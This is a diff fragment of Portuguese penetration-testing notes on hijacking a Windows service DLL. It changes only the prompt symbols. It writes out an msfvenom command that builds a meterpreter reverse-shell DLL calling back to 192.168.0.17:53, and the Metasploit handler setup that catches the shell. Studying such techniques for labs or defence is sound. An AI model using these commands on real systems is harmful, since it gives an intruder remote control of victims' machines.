@@ -93,13 +93,13 @@ Precisamos encontrar agora a dll equivalente ao servico.
 ###
 gerando a dll maliciosa para ser substituida e carregada com o servico for iniciado novamente.
 
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.17 LPORT=53 -f dll > nomedadll_relacionada_E_ser_substituida.dll
+> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.17 LPORT=53 -f dll > nomedadll_relacionada_E_ser_substituida.dll
 
 a dll gerada (nomedadll_relacionada_E_ser_substituida.dl) por ser adicionada no C:\TEMP, quando for iniciado o servico suspeito, ganharemos nossa shell, mas antes eh preciso deixa o modo handler ativo no MSFCONSOLE
 
 agora iniciamos o modo handler.
 
-$ use exploit/multi/handler
+> use exploit/multi/handler
 
     set PAYLOAD windows/x64/meterpreter/reverse_tcp
 
